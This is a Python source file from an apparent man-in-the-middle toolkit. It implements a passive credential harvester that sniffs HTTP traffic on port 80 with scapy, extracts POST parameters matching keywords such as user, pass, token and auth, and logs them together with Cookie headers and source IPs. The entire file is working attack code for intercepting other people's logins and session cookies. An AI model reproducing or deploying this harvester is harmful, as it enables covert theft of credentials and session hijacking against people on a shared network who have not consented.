# S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
# Copyright (c) 2026 M. Sami Furqan. All rights reserved.
# See LICENSE file for full terms.

"""
core/mitm/harvester.py — Credential harvester: sniffs HTTP POST bodies for auth data.
"""

from __future__ import annotations

import time
from typing import TYPE_CHECKING

from core.mitm._scapy import Raw, TCP, IP, sniff, conf

if TYPE_CHECKING:
    from PySide6.QtCore import Signal

_KEYWORDS = ["user", "pass", "email", "pwd", "login", "auth", "token", "name"]


def _parse_http_packet(packet: object, passive_log_signal: Signal) -> None:  # type: ignore[type-arg]
    try:
        if not packet.haslayer(Raw) or not packet.haslayer(TCP):  # type: ignore[union-attr]
            return
        payload = packet[Raw].load.decode("utf-8", errors="ignore")  # type: ignore[index]
        src_ip = packet[IP].src if packet.haslayer(IP) else "UNKNOWN"  # type: ignore[index, union-attr]
        if payload.startswith("POST "):
            found_data: list[str] = []
            if "\r\n\r\n" in payload:
                body = payload.split("\r\n\r\n", 1)[1]
                for param in body.split("&"):
                    for kw in _KEYWORDS:
                        if kw in param.lower() and "=" in param:
                            found_data.append(param.strip())
            if found_data:
                passive_log_signal.emit(f" CREDENTIALS DETECTED from {src_ip}:", "CRIT")
                for data in found_data:
                    passive_log_signal.emit(f"   -> {data}", "DATA")
        elif "Cookie:" in payload:
            for line in payload.split("\r\n"):
                if line.startswith("Cookie:"):
                    passive_log_signal.emit(f" COOKIE from {src_ip}: {line.strip()}", "DATA")
                    break
    except Exception:
        pass


def run_credential_harvester(
    running_flag: list[bool],
    log_signal: Signal,  # type: ignore[type-arg]
    passive_log_signal: Signal,  # type: ignore[type-arg]
    harvester_status_changed: Signal,  # type: ignore[type-arg]
) -> None:
    """Passively sniff TCP port 80 for HTTP POST credential data."""
    passive_log_signal.emit("Credential Harvester Active. Listening on TCP Port 80...", "INFO")
    harvester_status_changed.emit(True)
    while running_flag[0]:
        try:
            sniff(
                filter="tcp port 80",
                iface=conf.iface,
                prn=lambda pkt: _parse_http_packet(pkt, passive_log_signal),
                store=0,
                timeout=2,
            )
        except Exception:
            if running_flag[0]:
                time.sleep(0.5)
